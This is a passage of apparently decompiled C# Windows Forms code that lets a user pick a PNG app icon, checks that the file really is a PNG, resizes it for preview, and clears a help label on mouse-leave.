		cusomupdateimg.Enabled = false;
		Label45.Enabled = false;
		Label46.Enabled = false;
		Label47.Enabled = false;
	}

	public bool IsPngImage(string filePath)
	{
		bool result;
		try
		{
			using Image image = Image.FromFile(filePath);
			result = image.RawFormat.Guid == ImageFormat.Png.Guid;
		}
		catch (OutOfMemoryException projectError)
		{
			ProjectData.SetProjectError(projectError);
			result = false;
			ProjectData.ClearProjectError();
		}
		catch (FileNotFoundException projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			result = false;
			ProjectData.ClearProjectError();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			result = false;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private void Toggle1_CheckedChanged(object sender, EventArgs e)
	{
		try
		{
			if (Programmatically)
			{
				return;
			}
			if (CheckIconPatch.Checked)
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.InitialDirectory = reso.res_Path_iconsapps;
				openFileDialog.Title = "Selecte icon App (.png)";
				openFileDialog.Filter = "png Files|*.png";
				DialogResult dialogResult = openFileDialog.ShowDialog();
				if (dialogResult != DialogResult.OK)
				{
					PictureBox1.Image = null;
					iconPatch = "null";
					CheckIconPatch.Checked = false;
				}
				else if (!IsPngImage(openFileDialog.FileName))
				{
					Codes.MyMsgBox("incorrect format", "Make sure the image/icon is formatted as PNG", useno: false, Resources.error48px);
					PictureBox1.Image = null;
					iconPatch = "null";
					CheckIconPatch.Checked = false;
				}
				else
				{
					iconPatch = openFileDialog.FileName;
					PictureBox1.Image = Codes.ResizeImage(Image.FromFile(openFileDialog.FileName), new Size(144, 144));
				}
			}
			else
			{
				PictureBox1.Image = null;
				iconPatch = "null";
				CheckIconPatch.Checked = false;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Label16_MouseLeave(object sender, EventArgs e)
	{
		explaintoolstext.Text = "";
	}
}
